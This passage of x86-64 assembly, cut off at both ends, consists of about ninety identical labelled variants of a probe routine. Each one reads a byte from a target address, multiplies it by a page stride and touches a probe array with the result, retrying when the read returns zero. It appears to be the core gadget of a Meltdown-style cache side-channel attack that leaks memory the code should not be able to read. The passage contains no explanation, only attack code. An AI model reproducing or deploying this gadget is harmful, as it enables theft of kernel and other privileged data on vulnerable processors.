	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 4
.Lprobe_one_win0_var4:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 5
.Lprobe_one_win0_var5:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 6
.Lprobe_one_win0_var6:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 7
.Lprobe_one_win0_var7:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 8
.Lprobe_one_win0_var8:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 9
.Lprobe_one_win0_var9:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 10
.Lprobe_one_win0_var10:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 11
.Lprobe_one_win0_var11:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 12
.Lprobe_one_win0_var12:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 13
.Lprobe_one_win0_var13:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 14
.Lprobe_one_win0_var14:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 15
.Lprobe_one_win0_var15:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 16
.Lprobe_one_win0_var16:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 17
.Lprobe_one_win0_var17:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 18
.Lprobe_one_win0_var18:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 19
.Lprobe_one_win0_var19:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 20
.Lprobe_one_win0_var20:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 21
.Lprobe_one_win0_var21:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 22
.Lprobe_one_win0_var22:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 23
.Lprobe_one_win0_var23:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 24
.Lprobe_one_win0_var24:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 25
.Lprobe_one_win0_var25:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 26
.Lprobe_one_win0_var26:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 27
.Lprobe_one_win0_var27:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 28
.Lprobe_one_win0_var28:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 29
.Lprobe_one_win0_var29:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 30
.Lprobe_one_win0_var30:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 31
.Lprobe_one_win0_var31:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 32
.Lprobe_one_win0_var32:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 33
.Lprobe_one_win0_var33:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 34
.Lprobe_one_win0_var34:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 35
.Lprobe_one_win0_var35:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 36
.Lprobe_one_win0_var36:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 37
.Lprobe_one_win0_var37:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 38
.Lprobe_one_win0_var38:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 39
.Lprobe_one_win0_var39:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 40
.Lprobe_one_win0_var40:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 41
.Lprobe_one_win0_var41:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 42
.Lprobe_one_win0_var42:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 43
.Lprobe_one_win0_var43:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 44
.Lprobe_one_win0_var44:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 45
.Lprobe_one_win0_var45:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 46
.Lprobe_one_win0_var46:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 47
.Lprobe_one_win0_var47:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 48
.Lprobe_one_win0_var48:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 49
.Lprobe_one_win0_var49:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 50
.Lprobe_one_win0_var50:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 51
.Lprobe_one_win0_var51:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 52
.Lprobe_one_win0_var52:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 53
.Lprobe_one_win0_var53:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 54
.Lprobe_one_win0_var54:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 55
.Lprobe_one_win0_var55:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 56
.Lprobe_one_win0_var56:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 57
.Lprobe_one_win0_var57:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 58
.Lprobe_one_win0_var58:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 59
.Lprobe_one_win0_var59:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 60
.Lprobe_one_win0_var60:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 61
.Lprobe_one_win0_var61:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 62
.Lprobe_one_win0_var62:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 63
.Lprobe_one_win0_var63:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 64
.Lprobe_one_win0_var64:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 65
.Lprobe_one_win0_var65:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 66
.Lprobe_one_win0_var66:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 67
.Lprobe_one_win0_var67:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 68
.Lprobe_one_win0_var68:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 69
.Lprobe_one_win0_var69:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 70
.Lprobe_one_win0_var70:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 71
.Lprobe_one_win0_var71:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 72
.Lprobe_one_win0_var72:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 73
.Lprobe_one_win0_var73:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 74
.Lprobe_one_win0_var74:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 75
.Lprobe_one_win0_var75:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 76
.Lprobe_one_win0_var76:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 77
.Lprobe_one_win0_var77:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 78
.Lprobe_one_win0_var78:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 79
.Lprobe_one_win0_var79:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 80
.Lprobe_one_win0_var80:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 81
.Lprobe_one_win0_var81:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 82
.Lprobe_one_win0_var82:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 83
.Lprobe_one_win0_var83:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 84
.Lprobe_one_win0_var84:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 85
.Lprobe_one_win0_var85:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 86
.Lprobe_one_win0_var86:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 87
.Lprobe_one_win0_var87:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 88
.Lprobe_one_win0_var88:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 89
.Lprobe_one_win0_var89:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 90
.Lprobe_one_win0_var90:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 91
